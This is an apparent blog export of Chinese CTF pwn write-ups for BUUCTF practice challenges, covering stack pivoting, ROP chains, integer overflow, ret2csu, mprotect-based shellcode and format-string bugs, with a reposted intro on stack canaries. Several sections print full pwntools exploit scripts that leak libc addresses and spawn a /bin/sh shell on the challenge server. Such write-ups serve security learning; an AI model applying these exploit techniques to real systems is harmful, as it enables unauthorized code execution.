<p>里面很简单，没有什么复杂的函数，很适合借此了解栈迁移！首先read函数读取的字节数不够，只能够刚好覆盖返回地址。第二输入点的位置是bss段上，不是栈。所以这时候就是要把栈迁移到这里，因为在这里我们可以有足够的输入构建系统函数调用shell</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210407220423.png"></p>
<p>这题太坑了！！！！！！！！！！！！！首先，你如果使用了system函数调用/bin/sh，这时候无论你选择哪个版本的libc都无法成功获取shell！网上的师傅们好像也是这样，原因都只是模糊的说猜测是因为栈迁移的位置太靠近一些重要数据，可能还是影响到了什么东西。都采取了one_gadget的办法，这里我同样踩坑！</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408090610.png"></p>
<p>师傅们都是泄露出puts的got表地址，去查询出libc版本然后下载，然而我很惊奇的发现，我泄露的地址查询不到对应的libc版本。。。所以这里的exceve函数地址我是直接把师傅们的搬运过来了0x4526a</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408090158.png"></p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408090211.png"></p>
<p>以及，栈迁移的发送函数，只能选择send。（别问为什么，我选择的是sendline。。。一直出问题，甚至为了找问题，我每个与师傅们wp不同地方慢慢改，发现竟然是这个原因，只能怪自己粗心吧，猜测是这里的read读取过于严格，所有输入数据都是刚好，多输入了一个\n导致了问题的发生，下次一定注意！）还有就是距离重要数据太近这点，前面的ret执行多次就是为了避免这个，因为bss段距离.got.plt太近了，并且跳转回main函数的时候，还会进行一次巨大的升栈，所以的话执行多次ret把栈的位置往bss段的高地址处迁移</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408091459.png"></p>
<p>其他的话，wp如下：</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408092959.png"></p>
<h3 id="十二、bjdctf-2020-babyrop"><a href="#十二、bjdctf-2020-babyrop" class="headerlink" title="十二、bjdctf_2020_babyrop"></a>十二、bjdctf_2020_babyrop</h3><p>例行checksec一下，然后运行一下。开启了nx和部分relro缓解机制。运行的结果也不能看出些什么，进入ida看看吧</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408155229.png"></p>
<p>在一个函数里面有着很明显的溢出点，足够我们覆盖返回地址并且构造系统函数了。一道常规的rop，就不多说了，已经做烂了。。</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408155615.png"></p>
<p>exp如下：</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408170004.png"></p>
<h3 id="十三、others-shellcode"><a href="#十三、others-shellcode" class="headerlink" title="十三、others_shellcode"></a>十三、others_shellcode</h3><p>例行checksec以及执行附件，开启了nx，pie以及部分relro。运行附件发现直接就获取了shell。。</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210410073535.png"></p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210410073615.png"></p>
<p>然后我试着nc一下远程，看看是不是也能获取shell，没想到。。确实可以</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210410073831.png"></p>
<p>查看ida，发现附件中是已经调用了execve函数</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210410074925.png"></p>
<h3 id="十四、pwn2-sctf-2016"><a href="#十四、pwn2-sctf-2016" class="headerlink" title="十四、pwn2_sctf_2016"></a>十四、pwn2_sctf_2016</h3><p>例行checksec并且运行，只开启nx和部分的relro，拖入ida查看一下代码</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210418202516.png"></p>
<p>程序比较简单，可以很明确的发现，不存在后门函数，也没有明显的溢出点，被限制了。printf也没有问题，对于这样的情况，我第一时间是想到了整数溢出，通过整数溢出来越过检查，通过小数变成大数，从而溢出。</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210418202734.png"></p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210418205625.png"></p>
<p>接下来讲下漏洞点：main函数里面定义的v2是int类型的，而在get_n里面却是unsigned的，这里如果我们输入了一个负数，那么在get_n里面将变得非常大，足够我们溢出了。</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210418210123.png"></p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210418210150.png"></p>
<p>但是没有后门函数，所以只能进行rop了，用printf函数泄露got表地址，LibcSearcher一下，最终构造sys函数获取shell。网上师傅们都取了格式化参数，其实没必要的，本身printf存在着格式化字符串漏洞，所以可以直接printf出来，没必要再输入一个格式化参数。这里有个坑的地方，好吧，是我傻得踩到了还一直没看出来。get_n里面的getchar里面已经对0截断了，所以在第二次构造payload的时候，不可以像往常那样顺手写个p32(0)，后面感觉不对劲，我给他顺手改成了个p32(1)。。。。有点傻。。这个后面三个字节仍然是0，依旧截断了。写出来警示一下大伙，多注意点细节。</p>
<p>对了，libc找出来有15个，你可以知道我有多绝望了，一个个试了，竟然都不行，而且还是两遍！！！</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25066</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)<br>p.sendlineafter(<span class="hljs-string">&#x27;data!\n&#x27;</span>,payload)<br>p.recvline() <span class="hljs-comment">#接收最后的printf，让程序流执行完</span><br>printf_addr=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;printf address:&quot;</span>+<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>,printf_addr)<br>libc_base=printf_addr-libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>)+p32(system)+<span class="hljs-string">&#x27;beef&#x27;</span>+p32(binsh) <span class="hljs-comment">#beef！！！！！</span><br>p.sendlineafter(<span class="hljs-string">&#x27;data!\n&#x27;</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="十五、ciscn-2019-s-3"><a href="#十五、ciscn-2019-s-3" class="headerlink" title="十五、ciscn_2019_s_3"></a>十五、ciscn_2019_s_3</h3><p>常规执行checksec一下，查看保护，并且执行一下程序，看看回显</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210425202117.png"></p>
<p>出现了一堆乱码，可能是地址泄露了？进入ida看看情况如何</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210429123130.png"></p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210429123138.png"></p>
<p>main函数里面很简单，两个系统调用就没了，而有系统调用，那就去看看汇编代码。汇编代码前两行要注意，这里的rsp没有减少，在这题里面rsp=rbp了，后面计算偏移不可以把rbp覆盖了。左边的函数栏看一下，有个gadget的，进入查看</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210429123625.png"></p>
<p>很显然，这里面给出了两个调用号，0F和3BH，对应着这题两种解法，我们先介绍使用3BH调用号调用execve函数的解法，稍后再介绍另一种。</p>
<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>execve(“/bin/sh”,0,0)总共有三个参数，所以我们需要控制rdi,rsi,rdx三个寄存器的值，很显然，这是return to libc_csu_init。rsi和rdx的值很好控制，设置为0即可，而/bin/sh字符串则需要我们去寻找了，我们只有一个输入点，就是往栈上面输入/bin/sh，然后通过泄露栈的地址而得到该地址，从而把地址给rdi，最后再调用syscall函数，即可获取shell。</p>
<p>而write函数会输出栈上0x30个内存单元内容，通过调试，可以知道0x20位置处会泄露出一个栈上的地址，我们只需要计算该地址到/bin/sh的偏差，就可以获取/bin/sh的地址</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210429124551.png"></p>
<p>上图是我在本地调试的情况，0x7ffcaba65838是泄露出来的地址，可是扣去0x7ffcaba656f0得到的却是0x148，而我去网上找师傅们的wp是0x138，不太懂为什么。所以我只能本地获取到了shell，但是远程不能过了。</p>
<p>获取到了/bin/sh的地址，后面就是构造rop链了。</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210429124941.png"></p>
<p>这边csu里面的edi是有问题的，因为/bin/sh的地址是不止4个字节，所以edi是不够盛放的，所以我们需要rdi才行，这边使用了ROPgadget去寻找。所以后面payload构造rop时，这边还需要利用r12盛放栈上的内容进行跳转到栈上继续执行，而不能直接就在r12里面存放syscall地址进行直接调用。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&#x27;node3.buuoj.cn&#x27;,25007)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>syscall=<span class="hljs-number">0x400517</span><br>execve=<span class="hljs-number">0x4004e2</span><br>pop_rbx_rbp_r12_r13_r14_r15_ret=<span class="hljs-number">0x40059a</span><br>rdx_edi_rsi=<span class="hljs-number">0x400580</span><br>offset=<span class="hljs-number">0x138</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span>+p64(main)<br>p.send(payload)<br>p.recv(<span class="hljs-number">0x20</span>)<br>leak=u64(p.recv(<span class="hljs-number">8</span>))<br>binsh=leak-offset<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(leak)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(binsh)<br>gdb.attach(p,<span class="hljs-string">&#x27;b *main&#x27;</span>)<br><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span><br>payload+=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)<br>payload+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(binsh+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(rdx_edi_rsi)+p64(execve)  <span class="hljs-comment">#p64(execve)在栈上距离/bin/sh有0x50的长度</span><br>payload+=p64(pop_rdi)+p64(binsh)+p64(syscall)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>后面有缘再更新吧，，，，</p>
<h3 id="十六、ciscn-2019-es-2"><a href="#十六、ciscn-2019-es-2" class="headerlink" title="十六、ciscn_2019_es_2"></a>十六、ciscn_2019_es_2</h3><p>常规checksec查看保护措施</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210501105608.png"></p>
<p>程序只开启了NX，应该是道较为简单的题目，进入ida看看情况</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210501105715.png"></p>
<p>这里总共输入了两次数据，同时还能printf出来，可能会泄露一些重要地址信息。这里的read函数全部被限制到只够刚好覆盖到返回地址就不能再继续填充了，所以这里是用了栈迁移的思想，把栈迁移到栈上，制造一个假栈。</p>
<p>栈迁移利用leave 和ret指令改变ebp和esp的指向位置，所以要先得到要迁移的地址，也就是s位置，这边泄露ebp的值，从而计算两者偏差</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210501110624.png"></p>
<p>最顶上0xfffcd65就是s的位置，而0xffcd678就是ebp指向的位置，而在该地址处的内容为0xfffcd688就是我们泄露出来的内容，与s偏差为0x38</p>
<p>而系统函数附件中已经有了system的调用，差的就只有/bin/sh的字符串了，我们可以直接写在栈上，然后仍然是用泄露出来的地址算出/bin/sh地址，作为参数即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27262</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>system=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x80484b8</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span><br>p.recvline()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br>s_buf=ebp-<span class="hljs-number">0x38</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+<span class="hljs-string">&#x27;dead&#x27;</span>+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p32(s_buf)+p32(leave_ret)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu02</title>
    <url>/2021/04/05/2021-04-05-buu02/</url>
    <content><![CDATA[<h1 id="buu——pwn学习"><a href="#buu——pwn学习" class="headerlink" title="buu——pwn学习"></a>buu——pwn学习</h1><h3 id="四、ciscn-2019-n-8"><a href="#四、ciscn-2019-n-8" class="headerlink" title="四、ciscn_2019_n_8"></a>四、ciscn_2019_n_8</h3><p>checksec一下<img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405201012.png">发现保护基本都开了，有点害怕，赶紧进入ida一探究竟：</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405202606.png"></p>
<p>好吧，是我想多了，达成条件很简单，就是让var[13]的值等于17就可以获取shell，这里要注意一点，var是int类型数组，所以填充的时候，比如var[0]就要填进去4个字节的内容才能填满（这里我刚开始疏忽了，一直没能获取权限。。）所以要是用a去填充要先填52个才行，之后才是输入17，不过如果直接使用p32会更方便一些，exp如下：</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405205400.png"></p>
<h3 id="五、not-the-same-3dsctf-2016"><a href="#五、not-the-same-3dsctf-2016" class="headerlink" title="五、not_the_same_3dsctf_2016"></a>五、not_the_same_3dsctf_2016</h3><p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405205812.png"></p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405205847.png"></p>
<p>查看一下开启了nx保护，以及一部分的relro，然后运行了一下，好像什么都没有。。拖入ida看看</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405210102.png"></p>
<p>好家伙，main函数里面的东西，以及函数窗口里面的情况让我想起了<strong>get_started_3dsctf_2016</strong>这题，似乎很像的样子<img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405210308.png"></p>
<p>同样的不用覆盖ebp，直接就能到返回地址了，不清楚原理。。暂且不管吧，以后可能会看到的</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405211241.png"></p>
<p>这里有个函数，已经将flag的值读取并输入到了fl4g的位置，所以我们先用这个函数填充到返回地址处，把flag先读取到fl14为起始地址的内存中，接下来试着把这里的内容泄露出来，即可获取flag。所以我们需要write函数，并且因为write函数有三个参数，所以还需要pop 三个寄存器的指令进行清理栈，最后的p32(0)是pop中含着的ret操作，所以还需要再加一个返回地址，因为我们已经输出了flag，所以返回地址并不需要在意是哪，随便都可。具体exp如下：</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405212259.png"></p>
<h3 id="六、-HarekazeCTF2019-baby-rop"><a href="#六、-HarekazeCTF2019-baby-rop" class="headerlink" title="六、[HarekazeCTF2019]baby_rop"></a>六、[HarekazeCTF2019]baby_rop</h3><p>只开启了nx和部分的relro保护机制，并且运行了没有多少的内容，很正常的内容回显。应该不会难的，嗯，先这么想。</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405212721.png"></p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405212741.png"></p>
<p>进入ida看看，是不是跟想象的一样简单</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405213207.png"></p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405213218.png"></p>
<p>的确如此，没有乱起名字。。确实是简单的rop，system函数和/bin/sh字符全都在，并且还有scanf的无限制输入，exp如下：</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405214535.png"></p>
<p>小插曲，我进入的时候，很惊讶的发现没有flag。。。不知道是管理员忘了，还是说哪个人做了不小心可能删了吧。。</p>
<h3 id="七、jarvisoj-level2-x64"><a href="#七、jarvisoj-level2-x64" class="headerlink" title="七、jarvisoj_level2_x64"></a>七、jarvisoj_level2_x64</h3><p>只开启了nx，运行一下，貌似也很简单的样子，预测可能跟32位的level2差不多吧，就是变到了64位的环境下，可能为了考验传参</p>
<p><img  src="2021-04-05-buu02.assets/image-20210405220229158.png"  ><span class="image-caption">image-20210405220229158</span></p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405220316.png"></p>
<p>做法跟上一题差不多吧，就不多放图片了，直接exp了：</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210405221357.png"></p>
<h3 id="八、ciscn-2019-n-5"><a href="#八、ciscn-2019-n-5" class="headerlink" title="八、ciscn_2019_n_5"></a>八、ciscn_2019_n_5</h3><p>好家伙，nx都没开启，可能要直接在栈上执行shellcode了</p>
<p><img  src="2021-04-05-buu02.assets/image-20210407194309117.png"  ><span class="image-caption">image-20210407194309117</span></p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210407194556.png"></p>
<p>确实的，有个gets无限输入，很明显可以被利用的溢出点。不过后面带了个name有点奇怪，进入看看汇编是什么情况</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210407194714.png"></p>
<p>好吧，应该是ida出错了一些，只有调用了text，那就直接进行覆盖吧。因为pwntools已经有着自带的shellcode注入了，（要是没有的话我也不会写了，哈哈哈）exp如下：</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210407201139.png"></p>
<p>这里一开始是想直接就在栈上注入shellcode的，不过没能成功，可能是因为太长覆盖了一些其他信息了吧，所以就转移到bss上执行，在gdb中也能查看到bss也具有可执行性</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210407201152.png"></p>
<h3 id="九、ciscn-2019-ne-5"><a href="#九、ciscn-2019-ne-5" class="headerlink" title="九、ciscn_2019_ne_5"></a>九、ciscn_2019_ne_5</h3><p>开启了nx和部分的relro缓解措施</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210407201501.png"></p>
<p>进入ida按F5会反编译失败，只要进入到对应地址的scanf函数里面按F5对函数编译，再回到main函数即可反编译成功</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210407204835.png"></p>
<p>首先把第一个密码绕过，输入administrator即可，当我们进入下面额print函数查看可以发现有system函数的调用，此时我们只需要再查找到参数和溢出点即可，往上看，调用了fflush函数，里面有sh字符串。这里有个点，sh字符串也可以成为system的函数获取到shell的权限。那么只剩下溢出点了。前面的scanf函数输入，都无法溢出。只有在Addlog里面的scanf函数可以覆盖，然后再去到函数4GetFlag里面</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210407204813.png"></p>
<p>有个strcpy函数，可以把之前输入的src复制到dest中，造成溢出。exp如下：</p>
<p><img src="2021-04-05-buu02.assets/QQ%E5%9B%BE%E7%89%8720210407213005.png"></p>
<p>exp还有个要注意的就是system后跟的返回地址不能写p32(0)这样的，因为这么写，scanf函数遇到’\x00’会停止读取，所以我这里选择直接写四个字符串</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu01</title>
    <url>/2021/04/04/2021-04-04-buu01/</url>
    <content><![CDATA[<h1 id="buu——pwn学习"><a href="#buu——pwn学习" class="headerlink" title="buu——pwn学习"></a>buu——pwn学习</h1><h3 id="一、-第五空间2019-决赛-PWN5"><a href="#一、-第五空间2019-决赛-PWN5" class="headerlink" title="一、[第五空间2019 决赛]PWN5"></a>一、[第五空间2019 决赛]PWN5</h3><p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404104030.png"></p>
<p>checksec一下，32位文件，开启了nx与canary保护措施</p>
<p>拖入ida静态分析</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404104056.png"></p>
<p>在main函数就可以很清晰的发现，有个判断语句成立就可以获取shell，然后分析该如何使if判断成立，可以发现，要相等的是一个随机数，对于随机数一般都是覆盖成我们已知的一个数值，接着看，存在了printf(&amp;buf)字符串漏洞，很显然已经可以利用了，计算下字符串的偏移</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404104049.png"></p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404104053.png"></p>
<p>两种方式皆可算出偏移为10，构造%10$n，直接输入地址即可，因为在32位下，输入的就是4字节的数，刚好覆盖了随机数exp如下：</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404105030.png"></p>
<h3 id="二、get-started-3dsctf-2016"><a href="#二、get-started-3dsctf-2016" class="headerlink" title="二、get_started_3dsctf_2016"></a>二、get_started_3dsctf_2016</h3><p>老规矩，下载完附件，checksec一下：<img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404162136.png"></p>
<p>看起来没什么，ida查看一下，</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404162232.png"></p>
<p>很简单，而且溢出点也十分明显，直接get无限输入了</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404162344.png"></p>
<p>似乎还很好地存在了后门函数，flag就在眼前？？？当然不可能！</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404162512.png"></p>
<p>当你把exp写成这样的时候（不是写的，我写的在发现不行就给删了，懒得再写，百度上拿来的），只能在本机上才能顺利执行，在一个地方看到，说是因为远程会被过滤，把获取flag的地址过滤。所以此时只能换一种方式进行攻击，手握无限输入，不必太慌张。</p>
<p>有这么一个函数*<em>int mprotect(const void <em>start, size_t len, int prot)</em></em> 用来修改内存的权限的，第一个参数是修改内存的起始地址，第二个是修改地址的长度，第三个是权限值（可读为4，可写2，可执行为1，即是rwx 7），我们就要利用这个函数，找到一块较大的内存地址，进行修改权限，然后再调用read函数对这块内存输入shellcode，最后调转执行shellcode！</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404163230.png"></p>
<p>在gdb里面输入vmmap指令可以查看地址的权限，这里我们选择可读可写的0x080ea00作为起始地址。</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404163331.png"></p>
<p>在写payload需注意，这里不用覆盖ebp，我也不知道为什么。。但是ida里面确实是这样的。最后的exp如下：</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404163334.png"></p>
<p>其中的pop_3可以通过ROPgadget查询得到，使用这个是因为要保持堆栈平衡，使得程序正常运行。我们在构建mprotect和read函数时，需要不断的返回程序，所以这里需要比平常的多出pop这个指令，用来清理我们输入栈里的三个参数，达到堆栈平衡。这个看作是一个比较特殊的返回地址，不仅可以返回控制eip执行栈上的指令，还要顺带的清理我们多输入的参数，保证esp指向的位置始终不变化</p>
<h3 id="三、ciscn-2019-en-2"><a href="#三、ciscn-2019-en-2" class="headerlink" title="三、ciscn_2019_en_2"></a>三、ciscn_2019_en_2</h3><p>先checksec一下附件</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404194652.png"></p>
<p>开启了relro和nx，比较常见的保护措施。运行一下看看有什么东西</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404195052.png"></p>
<p>输入2直接无限循环了，毫无意义，输入3退出，输入1似乎会经过一些的运算还是什么，进入ida看看</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404195229.png"></p>
<p>跟运行并无太大差别，只有详细看看1的函数里面有没有什么漏洞。当看到__int16 v3，还以为可能出现整数溢出，可惜就是我想多了</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404195357.png"></p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404195534.png"></p>
<p>这里有一个无限输入，可以很轻易覆盖到返回地址，由于附件里面没有后门函数，很明显的rop了</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404195804.png"></p>
<p>因为要真正能到退栈进行地址跳转，就要先把整个函数的程序流执行完毕才能发生退栈。这里绕过就是因为strlen()遇到’\0’就会停止，利用这点可以直接退出循环，在这题里面还有个需要注意的点就是这里的代码</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404202418.png"></p>
<p>这里还有两个输出，需要接收了，否则会影响got表的泄露，exp如下：</p>
<p><img src="2021-04-04-buu01.assets/QQ%E5%9B%BE%E7%89%8720210404202427.png"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>canary绕过</title>
    <url>/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="转载自ctf-wiki"><a href="#转载自ctf-wiki" class="headerlink" title="转载自ctf wiki"></a>转载自ctf wiki</h2><h1 id="一、Canary"><a href="#一、Canary" class="headerlink" title="一、Canary"></a>一、Canary</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p>
<p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法(栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行(栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p>
<p>由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在。</p>
